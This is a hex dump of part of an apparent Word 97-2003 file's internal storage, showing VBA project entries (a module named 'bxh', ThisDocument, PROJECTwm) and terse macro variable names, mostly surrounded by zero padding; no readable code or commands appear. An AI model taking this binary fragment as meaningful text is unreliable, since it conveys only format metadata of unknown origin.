000147c0: 1000 0a00 5f42 5f76 6172 5f43 6872 5c3b  ...._B_var_Chr\;
000147d0: 1000 0a80 0000 ff03 0300 5f42 5f76 6172  .........._B_var
000147e0: 5f66 756e 444d 1000 0f80 0000 ff03 0300  _funDM..........
000147f0: 5f42 5f76 6172 5f77 6169 7454 696c 6c32  _B_var_waitTill2
00014800: ad10 0002 ffff 0101 9000 0000 1002 0000  ................
00014810: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014820: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014830: ffff ffff ffff 1e02 ffff ffff 2002 0200  ............ ...
00014840: ffff 2202 0300 ffff 2402 0400 ffff 2602  ..".....$.....&.
00014850: 0500 ffff 2802 0600 ffff 2a02 0700 ffff  ....(.....*.....
00014860: 2c02 0800 ffff 2f02 0000 0f00 ffff ffff  ,...../.........
00014870: ffff 3302 0100 0f00 ffff ffff ffff ffff  ..3.............
00014880: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00014890: ffff ffff ffff 0e02 0100 ffff 1100 1800  ................
000148a0: 0000 0100 2400 0000 0000 0000 0000 0000  ....$...........
000148b0: 0000 0000 0000 0000 0100 0000 0000 0000  ................
000148c0: 0000 0000 0002 0000 0000 0100 0000 0000  ................
000148d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000148e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000148f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014900: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014910: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014920: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014930: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014940: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014950: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014960: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014970: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014980: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014990: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000149a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000149b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000149c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000149d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000149e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000149f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014a00: 0d0a 5b57 6f72 6b73 7061 6365 5d0d 0a54  ..[Workspace]..T
00014a10: 6869 7344 6f63 756d 656e 743d 3738 2c20  hisDocument=78, 
00014a20: 3738 2c20 3130 3730 2c20 3536 322c 200d  78, 1070, 562, .
00014a30: 0a62 7868 3d31 3330 2c20 3133 302c 2031  .bxh=130, 130, 1
00014a40: 3132 322c 2036 3134 2c20 5a0d 0a00 0000  122, 614, Z.....
00014a50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014a60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014a70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014a80: 5468 6973 446f 6375 6d65 6e74 0054 0068  ThisDocument.T.h
00014a90: 0069 0073 0044 006f 0063 0075 006d 0065  .i.s.D.o.c.u.m.e
00014aa0: 006e 0074 0000 0062 7868 0062 0078 0068  .n.t...bxh.b.x.h
00014ab0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014ac0: 0100 feff 030a 0000 ffff ffff 0609 0200  ................
00014ad0: 0000 0000 c000 0000 0000 0046 2000 0000  ...........F ...
00014ae0: 4d69 6372 6f73 6f66 7420 576f 7264 2039  Microsoft Word 9
00014af0: 372d 3230 3033 2044 6f63 756d 656e 7400  7-2003 Document.
00014b00: 0a00 0000 4d53 576f 7264 446f 6300 1000  ....MSWordDoc...
00014b10: 0000 576f 7264 2e44 6f63 756d 656e 742e  ..Word.Document.
00014b20: 3800 f439 b271 0000 0000 0000 0000 0000  8..9.q..........
00014b30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014b40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014b50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014b60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014b70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014b80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014b90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014ba0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014bb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014bc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014bd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014be0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014bf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014c00: 5000 5200 4f00 4a00 4500 4300 5400 7700  P.R.O.J.E.C.T.w.
00014c10: 6d00 0000 0000 0000 0000 0000 0000 0000  m...............
00014c20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014c30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014c40: 1400 0200 ffff ffff ffff ffff ffff ffff  ................
00014c50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014c60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014c70: 0000 0000 b200 0000 3500 0000 0000 0000  ........5.......
00014c80: 0100 4300 6f00 6d00 7000 4f00 6200 6a00  ..C.o.m.p.O.b.j.
00014c90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014ca0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014cb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014cc0: 1200 0200 ffff ffff ffff ffff ffff ffff  ................
00014cd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014ce0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014cf0: 0000 0000 b300 0000 7200 0000 0000 0000  ........r.......
00014d00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014d10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014d20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014d30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014d40: 0000 0000 ffff ffff ffff ffff ffff ffff  ................
00014d50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014d60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014d70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014d80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014d90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014da0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014db0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014dc0: 0000 0000 ffff ffff ffff ffff ffff ffff  ................
00014dd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014de0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00014df0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
